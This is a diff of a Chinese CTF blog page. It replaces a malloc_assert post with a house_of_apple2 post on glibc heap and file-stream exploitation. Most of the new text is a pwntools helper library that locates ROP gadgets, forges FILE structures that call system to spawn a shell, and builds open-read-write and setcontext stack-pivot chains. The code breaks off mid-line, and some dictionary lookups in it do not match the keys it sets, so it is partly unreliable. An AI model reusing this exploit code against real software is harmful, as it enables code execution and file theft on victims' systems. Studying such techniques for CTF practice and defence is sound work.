@@ -4,11 +4,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="malloc_assert, Hexo">
-    <meta name="description" content="思维导图
-
-基本原理https://www.anquanke.com/post/id/235598
-https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
+    <meta name="keywords" content="house_of_apple2, q1ming">
+    <meta name="description" content="从main函数退出或exit原理&amp;amp;&amp;amp;源代码分析以后有空再说
+模板_exit变种_exit1.exit() 和 _exit() 都是用来终止进程的；
+2._exit() 执行后立即返回给内核，而 exit() 要先执行一些清楚">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +19,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>malloc_assert | Hexo</title>
+    <title>house_of_apple2 | q1ming</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
 
@@ -67,7 +66,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                     
                     <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                     
-                    <span class="logo-span">Hexo</span>
+                    <span class="logo-span">q1ming</span>
                 </a>
             </div>
             
@@ -171,7 +170,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
         
         <img src="/medias/logo.png" class="logo-img circle responsive-img">
         
-        <div class="logo-name">Hexo</div>
+        <div class="logo-name">q1ming</div>
         <div class="logo-desc">
             
             Never really desperate, only the lost of the soul.
@@ -337,12 +336,12 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/17.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">malloc_assert</h1>
+                    <h1 class="description center-align post-title">house_of_apple2</h1>
                 </div>
             </div>
         </div>
@@ -382,7 +381,7 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2025-01-15
+                    2025-01-16
                 </div>
                 
 
@@ -406,37 +405,21 @@ https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%8">
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="/images/1707895587701.png" alt="1707895587701"></p>
-<p><img src="/images/1707895671383.png" alt="1707895671383"></p>
-<h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/235598">https://www.anquanke.com/post/id/235598</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%82-pwn-writeup/">https://blog.wjhwjhn.com/posts/ciscn-2021-final-break%E7%8E%AF%E8%8A%82-pwn-writeup/</a></p>
-<h2 id="基本做法"><a href="#基本做法" class="headerlink" title="基本做法"></a>基本做法</h2><ol>
-<li><p>在一片已知地址的内存空间中部署和house_of_apple2略有不同的fake_struct；</p>
-</li>
-<li><p>让stderr指向这片内存；</p>
-</li>
-<li><p>修改top_chunk的size使之很小不满足malloc需求，且不满足top_chunk的页对齐；</p>
-</li>
-<li><p>malloc触发assert；</p>
-</li>
-</ol>
-<h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>当malloc等函数申请内存空间，且用到了top_chunk、而top_chunk的size较小不能满足需求的时候，就要重新分配空间，这个时候会查看top_chunk的size，判度胺是否页对齐，如果不对齐，就会触发<code>__malloc_assert</code>，则会有如下调用链：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__malloc_assert()<br>	__fxprintf()<br>		locked_vfxprintf()<br>			__vfprintf_internal()		<br></code></pre></td></tr></table></figure>
-
-<p>其中在<code>__fxprintf+208</code>的位置会有如下代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">0x00007fee65e7e8d0 &lt;+208&gt;:	mov    rdi,QWORD PTR [rbx+0x88] ;这里是重点<br></code></pre></td></tr></table></figure>
-
-<p>后边就和house_of_apple的利用链一样了；</p>
-<p>下面是<code>__fxprintf</code>函数的汇编代码：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs assembly">Dump of assembler code for function __fxprintf:<br>=&gt; 0x00007fee65e7e800 &lt;+0&gt;:	endbr64 <br>   0x00007fee65e7e804 &lt;+4&gt;:	push   rbp<br>   0x00007fee65e7e805 &lt;+5&gt;:	push   rbx<br>   0x00007fee65e7e806 &lt;+6&gt;:	mov    rbx,rdi ;这里一个<br>   0x00007fee65e7e809 &lt;+9&gt;:	sub    rsp,0xe8<br>   0x00007fee65e7e810 &lt;+16&gt;:	mov    QWORD PTR [rsp+0x40],rdx<br>   0x00007fee65e7e815 &lt;+21&gt;:	mov    QWORD PTR [rsp+0x48],rcx<br>   0x00007fee65e7e81a &lt;+26&gt;:	mov    QWORD PTR [rsp+0x50],r8<br>   0x00007fee65e7e81f &lt;+31&gt;:	mov    QWORD PTR [rsp+0x58],r9<br>   0x00007fee65e7e824 &lt;+36&gt;:	test   al,al<br>   0x00007fee65e7e826 &lt;+38&gt;:	je     0x7fee65e7e862 &lt;__fxprintf+98&gt;<br>   0x00007fee65e7e828 &lt;+40&gt;:	movaps XMMWORD PTR [rsp+0x60],xmm0<br>   0x00007fee65e7e82d &lt;+45&gt;:	movaps XMMWORD PTR [rsp+0x70],xmm1<br>   0x00007fee65e7e832 &lt;+50&gt;:	movaps XMMWORD PTR [rsp+0x80],xmm2<br>   0x00007fee65e7e83a &lt;+58&gt;:	movaps XMMWORD PTR [rsp+0x90],xmm3<br>   0x00007fee65e7e842 &lt;+66&gt;:	movaps XMMWORD PTR [rsp+0xa0],xmm4<br>   0x00007fee65e7e84a &lt;+74&gt;:	movaps XMMWORD PTR [rsp+0xb0],xmm5<br>   0x00007fee65e7e852 &lt;+82&gt;:	movaps XMMWORD PTR [rsp+0xc0],xmm6<br>   0x00007fee65e7e85a &lt;+90&gt;:	movaps XMMWORD PTR [rsp+0xd0],xmm7<br>   0x00007fee65e7e862 &lt;+98&gt;:	mov    rax,QWORD PTR fs:0x28<br>   0x00007fee65e7e86b &lt;+107&gt;:	mov    QWORD PTR [rsp+0x28],rax<br>   0x00007fee65e7e870 &lt;+112&gt;:	xor    eax,eax<br>   0x00007fee65e7e872 &lt;+114&gt;:	lea    rax,[rsp+0x100]<br>   0x00007fee65e7e87a &lt;+122&gt;:	mov    DWORD PTR [rsp+0x10],0x10<br>   0x00007fee65e7e882 &lt;+130&gt;:	mov    QWORD PTR [rsp+0x18],rax<br>   0x00007fee65e7e887 &lt;+135&gt;:	lea    rax,[rsp+0x30]<br>   0x00007fee65e7e88c &lt;+140&gt;:	mov    DWORD PTR [rsp+0x14],0x30<br>   0x00007fee65e7e894 &lt;+148&gt;:	mov    QWORD PTR [rsp+0x20],rax<br>   0x00007fee65e7e899 &lt;+153&gt;:	test   rbx,rbx<br>   0x00007fee65e7e89c &lt;+156&gt;:	je     0x7fee65e7e950 &lt;__fxprintf+336&gt;<br>   0x00007fee65e7e8a2 &lt;+162&gt;:	mov    eax,DWORD PTR [rbx]<br>   0x00007fee65e7e8a4 &lt;+164&gt;:	and    eax,0x8000<br>   0x00007fee65e7e8a9 &lt;+169&gt;:	jne    0x7fee65e7e8df &lt;__fxprintf+223&gt;<br>   0x00007fee65e7e8ab &lt;+171&gt;:	mov    rbp,QWORD PTR fs:0x10<br>   0x00007fee65e7e8b4 &lt;+180&gt;:	mov    rdi,QWORD PTR [rbx+0x88]<br>   0x00007fee65e7e8bb &lt;+187&gt;:	cmp    rbp,QWORD PTR [rdi+0x8]<br>   0x00007fee65e7e8bf &lt;+191&gt;:	je     0x7fee65e7e8db &lt;__fxprintf+219&gt;<br>   0x00007fee65e7e8c1 &lt;+193&gt;:	mov    edx,0x1<br>   0x00007fee65e7e8c6 &lt;+198&gt;:	lock cmpxchg DWORD PTR [rdi],edx<br>   0x00007fee65e7e8ca &lt;+202&gt;:	jne    0x7fee65e7e960 &lt;__fxprintf+352&gt;<br>   0x00007fee65e7e8d0 &lt;+208&gt;:	mov    rdi,QWORD PTR [rbx+0x88] ;这里是重点<br>   0x00007fee65e7e8d7 &lt;+215&gt;:	mov    QWORD PTR [rdi+0x8],rbp<br>   0x00007fee65e7e8db &lt;+219&gt;:	add    DWORD PTR [rdi+0x4],0x1<br>   0x00007fee65e7e8df &lt;+223&gt;:	xor    ecx,ecx<br>   0x00007fee65e7e8e1 &lt;+225&gt;:	lea    rdx,[rsp+0x10]<br>   0x00007fee65e7e8e6 &lt;+230&gt;:	mov    rdi,rbx<br>   0x00007fee65e7e8e9 &lt;+233&gt;:	call   0x7fee65e7e560 &lt;locked_vfxprintf&gt;<br>   0x00007fee65e7e8ee &lt;+238&gt;:	test   DWORD PTR [rbx],0x8000<br>   0x00007fee65e7e8f4 &lt;+244&gt;:	jne    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e8f6 &lt;+246&gt;:	mov    rdi,QWORD PTR [rbx+0x88]<br>   0x00007fee65e7e8fd &lt;+253&gt;:	mov    ecx,DWORD PTR [rdi+0x4]<br>   0x00007fee65e7e900 &lt;+256&gt;:	lea    edx,[rcx-0x1]<br>   0x00007fee65e7e903 &lt;+259&gt;:	mov    DWORD PTR [rdi+0x4],edx<br>   0x00007fee65e7e906 &lt;+262&gt;:	test   edx,edx<br>   0x00007fee65e7e908 &lt;+264&gt;:	je     0x7fee65e7e928 &lt;__fxprintf+296&gt;<br>   0x00007fee65e7e90a &lt;+266&gt;:	mov    rdx,QWORD PTR [rsp+0x28]<br>   0x00007fee65e7e90f &lt;+271&gt;:	sub    rdx,QWORD PTR fs:0x28<br>   0x00007fee65e7e918 &lt;+280&gt;:	jne    0x7fee65e7e974 &lt;__fxprintf+372&gt;<br>   0x00007fee65e7e91a &lt;+282&gt;:	add    rsp,0xe8<br>   0x00007fee65e7e921 &lt;+289&gt;:	pop    rbx<br>   0x00007fee65e7e922 &lt;+290&gt;:	pop    rbp<br>   0x00007fee65e7e923 &lt;+291&gt;:	ret    <br>   0x00007fee65e7e924 &lt;+292&gt;:	nop    DWORD PTR [rax+0x0]<br>   0x00007fee65e7e928 &lt;+296&gt;:	mov    QWORD PTR [rdi+0x8],0x0<br>   0x00007fee65e7e930 &lt;+304&gt;:	xchg   DWORD PTR [rdi],edx<br>   0x00007fee65e7e932 &lt;+306&gt;:	cmp    edx,0x1<br>   0x00007fee65e7e935 &lt;+309&gt;:	jle    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e937 &lt;+311&gt;:	mov    DWORD PTR [rsp+0x8],eax<br>   0x00007fee65e7e93b &lt;+315&gt;:	call   0x7fee65e91300 &lt;__GI___lll_lock_wake_private&gt;<br>   0x00007fee65e7e940 &lt;+320&gt;:	mov    eax,DWORD PTR [rsp+0x8]<br>   0x00007fee65e7e944 &lt;+324&gt;:	jmp    0x7fee65e7e90a &lt;__fxprintf+266&gt;<br>   0x00007fee65e7e946 &lt;+326&gt;:	cs nop WORD PTR [rax+rax*1+0x0]<br>   0x00007fee65e7e950 &lt;+336&gt;:	mov    rax,QWORD PTR [rip+0x19b551]        # 0x7fee66019ea8<br>   0x00007fee65e7e957 &lt;+343&gt;:	mov    rbx,QWORD PTR [rax];先调到这里来取_IO_2_1_stderr<br>   0x00007fee65e7e95a &lt;+346&gt;:	jmp    0x7fee65e7e8a2 &lt;__fxprintf+162&gt;<br>   0x00007fee65e7e95f &lt;+351&gt;:	nop<br>   0x00007fee65e7e960 &lt;+352&gt;:	mov    QWORD PTR [rsp+0x8],rsi<br>   0x00007fee65e7e965 &lt;+357&gt;:	call   0x7fee65e91230 &lt;__GI___lll_lock_wait_private&gt;<br>   0x00007fee65e7e96a &lt;+362&gt;:	mov    rsi,QWORD PTR [rsp+0x8]<br>   0x00007fee65e7e96f &lt;+367&gt;:	jmp    0x7fee65e7e8d0 &lt;__fxprintf+208&gt;<br>   0x00007fee65e7e974 &lt;+372&gt;:	call   0x7fee65f36550 &lt;__stack_chk_fail&gt;<br><br></code></pre></td></tr></table></figure>
+                <h2 id="从main函数退出或exit"><a href="#从main函数退出或exit" class="headerlink" title="从main函数退出或exit"></a>从main函数退出或exit</h2><h3 id="原理-源代码分析"><a href="#原理-源代码分析" class="headerlink" title="原理&amp;&amp;源代码分析"></a>原理&amp;&amp;源代码分析</h3><p>以后有空再说</p>
+<h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><h2 id="exit变种"><a href="#exit变种" class="headerlink" title="_exit变种"></a>_exit变种</h2><h3 id="exit"><a href="#exit" class="headerlink" title="_exit"></a>_exit</h3><p>1.exit() 和 _exit() 都是用来终止进程的；</p>
+<p>2._exit() 执行后立即返回给内核，而 exit() 要先执行一些清楚操作，然后将控制权交给内核；</p>
+<p>3._exit() 在&lt;unistd.h&gt;中声明；</p>
+<p>4.调用 _exit() 函数时，其会关闭进程所有的文件描述符，清理内存以及其它一些内核清理函数，但不会刷新流（stdin，stdout，stderr……）</p>
+<p>:star:如果将exit()替换为_exit()，最终结束时则是进行了syscall来结束，并没有机会调用_IO_cleanup，read、write无法触发IO流；</p>
+<h3 id="触发malloc-assert"><a href="#触发malloc-assert" class="headerlink" title="触发malloc_assert"></a>触发malloc_assert</h3><p>1.在_int_maloc中存在一个<code>assert(chunk_main_arena(bck-bk))</code>的位置可以触发；</p>
+<p>2.当top_chunk大小不够分配的时候则会进入sysmalloc中；</p>
+<h3 id="house-of-apple2-另一种触发"><a href="#house-of-apple2-另一种触发" class="headerlink" title="house_of_apple2 另一种触发"></a>house_of_apple2 另一种触发</h3><p>1.首先接触stderr指向一个我们可控可写的地址（笔者习惯称之为f1_addr）(这里可以用largebinattack)</p>
+<p>2.在上述f1_addr中仍然部署之前的house_of_apple2的payload，但是要在偏移0x88（_lock）字段写一个合法地址；</p>
+<p>3.修改top_chunk的size为很小，申请chunk时触发malloc_assert；</p>
+<h2 id="较新的一版利用工具"><a href="#较新的一版利用工具" class="headerlink" title="较新的一版利用工具"></a>较新的一版利用工具</h2><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#version 2023.11.25</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_magic_addr</span>(<span class="hljs-params">libc_base, libc_filename, show=<span class="hljs-number">0</span></span>):<br>    shell = <span class="hljs-string">&quot;ROPgadget --binary &quot;</span><br>    shell += libc_filename<br>    shell += <span class="hljs-string">&#x27; --only &quot;mov|call&quot; | grep &quot;mov rdx, qword ptr \\[rdi + 8\\]&quot; &gt; gadget&#x27;</span><br>    os.system(shell)<br>    magic = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./gadget&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            num = line[:<span class="hljs-number">18</span>]<br>            magic = <span class="hljs-built_in">int</span>(num, <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">break</span><br>    magic = libc_base + magic<br>    <span class="hljs-keyword">if</span> show == <span class="hljs-number">1</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;=&#x27;</span>*<span class="hljs-number">0x20</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;the magic_addr is:&quot;</span>, <span class="hljs-built_in">hex</span>(magic))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span>*<span class="hljs-number">0x20</span>)<br>        sleep(<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">return</span> magic<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_rops</span>(<span class="hljs-params">libc_base, libc_filename</span>):<br>    res = &#123;&#125;<br>    libc = ELF(libc_filename)<br>    rop = ROP(libc_filename)<br>    <span class="hljs-comment">#pop_rdi</span><br>    pop_rdi1 = rop.find_gadget([<span class="hljs-string">&#x27;pop rdi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">if</span> pop_rdi1 == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not find pop rdi&quot;</span>)<br>        sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span><br>    pop_rdi = libc_base + pop_rdi1[<span class="hljs-number">0</span>]<br>    res[<span class="hljs-string">&quot;pop_rdi&quot;</span>] = pop_rdi<br>    <span class="hljs-comment">#pop_rsi</span><br>    pop_rsi1 = rop.find_gadget([<span class="hljs-string">&#x27;pop rsi&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">if</span> pop_rsi1 == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not find pop rsi&quot;</span>)<br>        sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span><br>    pop_rsi = libc_base + pop_rsi1[<span class="hljs-number">0</span>]<br>    res[<span class="hljs-string">&#x27;pop_rsi&#x27;</span>] = pop_rsi<br>    <span class="hljs-comment">#pop_rdx_r12</span><br>    pop_rdx1 = rop.find_gadget([<span class="hljs-string">&#x27;pop rdx&#x27;</span>, <span class="hljs-string">&#x27;pop r12&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">if</span> pop_rdx1 == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not find pop rdx&quot;</span>)<br>        sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span><br>    pop_rdx = libc_base + pop_rdx1[<span class="hljs-number">0</span>]<br>    res[<span class="hljs-string">&#x27;pop_rdx&#x27;</span>] = pop_rdx<br>    <span class="hljs-comment">#pop_rax</span><br>    pop_rax1 = rop.find_gadget([<span class="hljs-string">&#x27;pop rax&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">if</span> pop_rax1 == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not find pop rax&quot;</span>)<br>        sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span><br>    pop_rax = libc_base + pop_rax1[<span class="hljs-number">0</span>]<br>    res[<span class="hljs-string">&#x27;pop_rax&#x27;</span>] = pop_rax<br>    <span class="hljs-comment">#ret</span><br>    shell2 = <span class="hljs-string">&quot;ROPgadget --binary &quot;</span><br>    shell2 += libc_filename<br>    shell2 += <span class="hljs-string">&#x27; --only &quot;ret&quot;  &gt; ./ret.txt&#x27;</span><br>    os.system(shell2)<br>    i = <span class="hljs-number">0</span><br>    ret = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./ret.txt&#x27;</span>) <span class="hljs-keyword">as</span> f2:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f2:<br>            i = i + <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> i == <span class="hljs-number">1</span> <span class="hljs-keyword">or</span> i == <span class="hljs-number">2</span>:<br>                <span class="hljs-keyword">continue</span><br>            num = line[:<span class="hljs-number">18</span>]<br>            ret = <span class="hljs-built_in">int</span>(num, <span class="hljs-number">16</span>)<br>            <span class="hljs-keyword">break</span><br>    ret = libc_base + ret<br>    res[<span class="hljs-string">&#x27;ret&#x27;</span>] = ret<br>    <span class="hljs-comment">#syscall</span><br>    syscall1 = rop.find_gadget([<span class="hljs-string">&#x27;syscall&#x27;</span>, <span class="hljs-string">&#x27;ret&#x27;</span>])<br>    <span class="hljs-keyword">if</span> syscall1 == <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;not find syscall&quot;</span>)<br>        sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">return</span><br>    syscall = libc_base + syscall1[<span class="hljs-number">0</span>]<br>    res[<span class="hljs-string">&#x27;syscall&#x27;</span>] = syscall<br><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_apple2</span>(<span class="hljs-params">libc_base, libc_filename, f1_addr</span>):<br>    libc = ELF(libc_filename)<br>    jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    wide_addr = f1_addr<br>    vtable_addr = f1_addr <br>    pay = <span class="hljs-string">b&#x27;  @;sh&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(<span class="hljs-number">1</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(system)<br>    pay = pay.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(wide_addr)<br>    pay = pay.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(jumps)<br>    pay = pay.ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(vtable_addr)<br>    <span class="hljs-keyword">return</span> pay<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_apple2_assert</span>(<span class="hljs-params">libc_base, libc_filename, f1_addr</span>):<br>    libc = ELF(libc_filename)<br>    jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    system = libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    wide_addr = f1_addr<br>    vtable_addr = f1_addr<br>    pay = <span class="hljs-string">b&#x27;  @;sh&#x27;</span>.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(<span class="hljs-number">1</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(system)<br>    pay = pay.ljust(<span class="hljs-number">0x88</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(f1_addr+<span class="hljs-number">0x1000</span>)<br>    pay = pay.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(wide_addr)<br>    pay = pay.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(jumps)<br>    pay = pay.ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(vtable_addr)<br>    <span class="hljs-keyword">return</span> pay<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">house_of_apple_orw</span>(<span class="hljs-params">libc_base, libc_filename, f1_addr, sysbin</span>):<br>    libc = ELF(libc_filename)<br>    jumps = libc_base + libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>]<br>    wide_addr = f1_addr<br>    vtable_addr = f1_addr<br>    magic = get_magic_addr(libc_base, libc_filename)<br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    pay = p64(<span class="hljs-number">0</span>)+p64(f1_addr+<span class="hljs-number">0x100</span>-<span class="hljs-number">0x20</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x28</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(<span class="hljs-number">1</span>)<br>    pay = pay.ljust(<span class="hljs-number">0x68</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(magic)<br>    pay = pay.ljust(<span class="hljs-number">0xa0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(wide_addr)<br>    pay = pay.ljust(<span class="hljs-number">0xd8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(jumps)<br>    pay = pay.ljust(<span class="hljs-number">0xe0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    pay += p64(vtable_addr)<br>    pay = pay.ljust(<span class="hljs-number">0x100</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>    <span class="hljs-keyword">if</span> sysbin == <span class="hljs-number">0</span>:<br>        tmp = stack_povit_orw(libc_base, libc_filename, f1_addr+<span class="hljs-number">0xe0</span>)<br>    <span class="hljs-keyword">else</span>:<br>        tmp = stack_povit_orw(libc_base, libc_filename, f1_addr+<span class="hljs-number">0xe0</span>, sysbin=<span class="hljs-number">1</span>)<br>    tmp = tmp[<span class="hljs-number">32</span>:]<br>    pay += tmp<br>    <span class="hljs-keyword">return</span> pay<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw</span>(<span class="hljs-params">libc_base, libc_filename, flag, sysbin=<span class="hljs-number">0</span></span>):<br>    libc = ELF(libc_filename)<br>    rop = ROP(libc_filename)<br><br>    rops = get_rops(libc_base, libc_filename)<br>    pop_rdi = rops[<span class="hljs-string">&#x27;pop rdi&#x27;</span>]<br>    pop_rsi = rops[<span class="hljs-string">&#x27;pop rsi&#x27;</span>]<br>    pop_rdx = rops[<span class="hljs-string">&#x27;pop rdx&#x27;</span>]  <span class="hljs-comment">#pop_rdx_r12</span><br>    pop_rax = rops[<span class="hljs-string">&#x27;pop_rax&#x27;</span>]<br>    syscall = rops[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br>    ret = rops[<span class="hljs-string">&#x27;ret&#x27;</span>]<br>    open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>    <span class="hljs-keyword">if</span> sysbin == <span class="hljs-number">0</span>:<br>        pay = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>        pay += p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(flag+<span class="hljs-number">0x10</span>)+p64(pop_rdx)+p64(<span class="hljs-number">0x70</span>)+p64(<span class="hljs-number">0</span>)+p64(read)<br>        pay += p64(pop_rdi)+p64(<span class="hljs-number">1</span>)+p64(write)<br>    <span class="hljs-keyword">else</span>:<br>        pay = p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(pop_rax)+p64(<span class="hljs-number">2</span>)+p64(syscall)<br>    <span class="hljs-keyword">return</span> pay<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stack_povit_orw</span>(<span class="hljs-params">libc_base, libc_filename, f1_addr, sysbin=<span class="hljs-number">0</span></span>):<br>    libc = ELF(libc_filename)<br>    rops = get_rops(libc_base, libc_filename)<br>    pop_rdi = rops[<span class="hljs-string">&#x27;pop_rdi&#x27;</span>]<br>    pop_rsi = rops[<span class="hljs-string">&#x27;pop_rsi&#x27;</span>]<br>    pop_rdx = rops[<span class="hljs-string">&#x27;pop_rdx&#x27;</span>] <span class="hljs-comment">#pop_rdx_r12_ret</span><br>    pop_rax = rops[<span class="hljs-string">&#x27;pop_rax&#x27;</span>]<br>    syscall = rops[<span class="hljs-string">&#x27;syscall&#x27;</span>]<br>    ret = rops[<span class="hljs-string">&#x27;ret&#x27;</span>]<br>    open_addr = libc_base + libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>    read = libc_base + libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>    write = libc_base + libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]    <br>    magic = get_magic_addr(libc_base, libc_filename)<br>    setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>]<br>    <span class="hljs-keyword">if</span> sysbin == <span class="hljs-number">0</span>:<br>        flag = f1_addr + <span class="hljs-number">0xe0</span><br>        res = p64(<span class="hljs-number">0</span>)+p64(f1_addr)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+p64(setcontext+<span class="hljs-number">61</span>)<br>        res += p64(pop_rdi)+p64(flag)+p64(pop_rsi)+p64(<span class="hljs-number">0</span>)+p64(open_addr)<br>        res += p64(pop_rdi)+p64(<span class="hljs-number">3</span>)+p64(pop_rsi)+p64(flag+<span 